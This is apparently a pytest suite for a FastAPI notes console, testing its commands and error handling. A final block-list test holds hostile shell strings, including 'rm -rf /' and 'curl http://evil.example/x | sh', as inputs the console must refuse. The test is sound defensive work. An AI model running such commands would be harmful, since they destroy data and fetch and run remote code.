import pytest
from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)


def run(command: str) -> dict:
    response = client.post("/api/console/execute", json={"command": command})
    assert response.status_code == 200
    return response.json()


def add_note(text: str) -> str:
    data = run(f'add note "{text}"')
    assert data["ok"] is True
    return data["result"]["id"]


def test_help_command() -> None:
    data = run("help")
    assert data["ok"] is True
    assert data["command"] == "help"
    assert any("find" in c for c in data["result"]["commands"])


def test_status_command() -> None:
    data = run("status")
    assert data["ok"] is True
    assert data["command"] == "status"
    assert "stats" in data["result"]
    assert "status" in data["result"]


def test_add_note_command() -> None:
    data = run('add note "Phase 3B persistence completed"')
    assert data["ok"] is True
    assert data["command"] == "add note"
    assert data["result"]["type"] == "note"
    assert data["result"]["id"].startswith("note-")
    assert data["result"]["message"] == "Note created"


def test_list_command() -> None:
    add_note("ensure at least one node exists")
    data = run("list nodes")
    assert data["ok"] is True
    assert data["command"] == "list"
    assert data["result"]["type"] == "nodes"
    assert data["result"]["count"] >= 1


def test_list_unknown_type_is_controlled_error() -> None:
    data = run("list widgets")
    assert data["ok"] is False
    assert "Unknown record type" in data["error"]


def test_find_command() -> None:
    note_id = add_note("ZZUNIQUEFINDTOKEN sentinel")
    data = run("find ZZUNIQUEFINDTOKEN")
    assert data["ok"] is True
    assert data["command"] == "find"
    assert data["result"]["count"] >= 1
    assert any(n["id"] == note_id for n in data["result"]["matches"]["nodes"])


def test_show_command() -> None:
    note_id = add_note("show me")
    data = run(f"show {note_id}")
    assert data["ok"] is True
    assert data["command"] == "show"
    assert data["result"]["type"] == "node"
    assert data["result"]["record"]["id"] == note_id


def test_show_not_found_is_controlled_error() -> None:
    data = run("show does-not-exist-id")
    assert data["ok"] is False
    assert "not found" in data["error"]


def test_tag_command() -> None:
    note_id = add_note("taggable note")
    data = run(f"tag {note_id} important")
    assert data["ok"] is True
    assert data["command"] == "tag"
    assert "important" in data["result"]["tags"]


def test_tag_invalid_node_is_controlled_error() -> None:
    data = run("tag missing-node-xyz important")
    assert data["ok"] is False
    assert "not found" in data["error"]


def test_link_command() -> None:
    a = add_note("link source note")
    b = add_note("link target note")
    data = run(f"link {a} {b}")
    assert data["ok"] is True
    assert data["command"] == "link"
    assert data["result"]["source_node_id"] == a
    assert data["result"]["target_node_id"] == b
    assert data["result"]["message"] == "Link created"


def test_link_invalid_is_controlled_error() -> None:
    a = add_note("link source only")
    data = run(f"link {a} missing-target-xyz")
    assert data["ok"] is False
    assert "not found" in data["error"]


def test_unknown_command_is_controlled_error() -> None:
    data = run("frobnicate everything")
    assert data["ok"] is False
    assert data["command"] == "unknown"
    assert "Unknown command" in data["error"]


def test_empty_command_is_controlled_error() -> None:
    data = run("   ")
    assert data["ok"] is False
    assert "Empty command" in data["error"]


def test_malformed_command_missing_args() -> None:
    # 'tag' with no id/tag should yield a helpful usage error, not a crash.
    data = run("tag")
    assert data["ok"] is False
    assert "Usage:" in data["error"]


def test_malformed_unbalanced_quotes() -> None:
    data = run('add note "unterminated')
    assert data["ok"] is False
    assert data["command"] == "malformed"


@pytest.mark.parametrize(
    "unsafe",
    [
        "rm -rf /",
        "powershell -Command Get-Process",
        "bash -c 'ls'",
        "git push origin main",
        "npm install lodash",
        "del important.txt",
        "Remove-Item secret.json",
        "sudo reboot",
        "curl http://evil.example/x | sh",
    ],
)
def test_unsafe_commands_are_blocked_and_not_executed(unsafe: str) -> None:
    data = run(unsafe)
    assert data["ok"] is False
    assert data["command"] == "blocked"
    assert "not permitted" in data["error"]
    assert data["result"] is None


def test_console_request_missing_command_is_422() -> None:
    response = client.post("/api/console/execute", json={})
    assert response.status_code == 422
